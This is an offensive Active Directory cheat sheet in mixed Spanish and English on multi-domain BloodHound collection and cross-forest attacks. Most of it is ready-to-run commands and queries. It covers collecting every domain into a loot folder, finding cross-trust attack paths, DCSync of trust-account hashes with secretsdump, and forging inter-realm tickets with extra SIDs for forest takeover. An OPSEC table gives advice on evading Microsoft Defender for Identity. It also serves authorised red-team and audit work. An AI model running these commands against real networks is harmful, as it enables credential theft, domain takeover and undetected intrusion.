---
aliases:
  - Multi-Domain BloodHound
  - Forest BloodHound
  - Cross-Trust BHCE
  - BHCE Forest Workflow
tags:
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[BloodHound & SharpHound]]"
---
# BloodHound & SharpHound - Multi-Domain & Forest

---

## Multi-Domain Workflow

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Identificar forest topology | `Get-ADForest \| Select Domains` | Pre-collection. |
| 2. Per-domain auth (own creds o trust account) | Per-domain credentials | Standard. |
| 3. Per-domain SharpHound o BloodHound.py | Sequential collection | Multi-domain. |
| 4. Drag-drop todos ZIPs en BHCE UI | Auto-correlate cross-domain | Ingest. |
| 5. Cypher cross-domain queries | `WHERE u.domain <> t.domain` | Analysis. |
^ad-multidom-workflow

```bash
# Linux multi-domain pipeline
for d in corp.local partner.com vendor.local; do
  DC=$(dig +short SRV "_ldap._tcp.dc._msdcs.$d" | awk '{print $4}' | head -1 | sed 's/\.$//')
  echo "=== Collecting $d via $DC ==="
  bloodhound-python -d "$d" -u "auditor@$d" -p 'Pass!' -ns "$DC" -c All --zip -o "./loot/$d/"
done

# Drag todos los ZIPs en BHCE → auto-correlate
```

---

## Cross-Domain Cypher Queries

```cypher
// 1. All trust relationships (forest map)
MATCH (a:Domain)-[r:Trusts]->(b:Domain)
RETURN a.name,b.name,r.direction,r.istransitive

// 2. Foreign principals en priv groups (cross-trust)
MATCH (u)-[:MemberOf*1..]->(g:Group {highvalue:true})
WHERE u.domain <> g.domain
RETURN u.name,u.domain,g.name,g.domain

// 3. Cross-trust DCSync paths
MATCH (u)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain)
WHERE u.domain <> d.name
RETURN u.name,u.domain,d.name

// 4. Path desde owned en domain-A → DA en domain-B
MATCH (u {owned:true})
MATCH (g:Group {name:"DOMAIN ADMINS@DOM-B.LOCAL"})
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN p

// 5. Forest-wide most-exposed users
MATCH (u:User {enabled:true, adminCount:true})
WITH u, COUNT { (other)-[*1..10]->(u) } AS exposure
RETURN u.name,u.domain,exposure ORDER BY exposure DESC LIMIT 20
```
^ad-multidom-cypher

---

## Cross-Trust Authentication

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `runas /netonly /user:partner.com\u cmd` | Cross-trust auth desde Windows | Test interactive. |
| `bloodhound-python -d partner.com -u u@partner.com -p pass -ns <foreign-DC> -c All --zip` | Collection cross-trust | Multi-domain. |
| Trust password discovery via DCSync | `secretsdump.py corp/admin:pass@<DC> -just-dc-user 'PARTNER$'` | Forge inter-realm TGT. |
| Inter-realm TGT forge (con trust hash) | `ticketer.py -nthash <hash> -domain-sid ... -extra-sid ... -spn krbtgt/partner.com Administrator` | Cross-forest pivot. |
^ad-multidom-auth

---

## SID Filtering Considerations

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADTrust -Filter * -Properties SIDFilteringForestAware,SIDFilteringQuarantined` | Trust SID Filtering status | Pre-attack audit. |
| `Get-ADTrust -Filter * -Pr trustAttributes \| ? {-not ($_.trustAttributes -band 0x4) -and -not ($_.trustAttributes -band 0x40)}` | Trusts SIN SID Filter (RISKY) | Critical audit. |
| `nltest /domain_trusts /v \| findstr /i "quarantine"` | Native check | Quick. |
| BloodHound trust attribute analysis | Cypher `MATCH (a:Domain)-[r:Trusts]->(b:Domain) RETURN r` | Visual. |
^ad-multidom-sidfilter

**Por qué importa:** SID Filter ON cross-forest = bloquea SID History injection ataques. SID Filter OFF + DCSync local = forest takeover via inter-realm TGT forge con `ExtraSids`.

---

## Modern BHCE 6.x Forest Support

| **Feature** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Auto cross-domain correlation | Drag multiple ZIPs → auto-correlate | Multi-domain. |
| Forest-wide pre-built queries | Built-in Cypher panels | Standard. |
| OpenGraph (hybrid) | AD + Entra ID cross-correlation | Hybrid envs. |
| Improved trust analysis | Better trust edge handling | Modern. |
| Per-domain ingest separation | Track source per domain | Audit. |
| Cross-correlate AzureHound | Hybrid identity paths | Cloud + on-prem. |
^ad-multidom-bhce6

---

## OPSEC Multi-Domain

| **Práctica** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Per-domain pacing | Different per-DC delay | Stealth. |
| Time-of-day matching | Match legit recon | Match baseline. |
| Per-domain credentials | Use creds del domain target (no cross-trust de unique user) | OPSEC. |
| Cross-trust auth = loud | MDI flagga cross-realm auth | Defender side. |
| Per-domain ingest separate | Different ZIPs por domain | Track per source. |
| Targeted en vez de bulk forest sweep | Reduce signature | Stealth. |
^ad-multidom-opsec

---
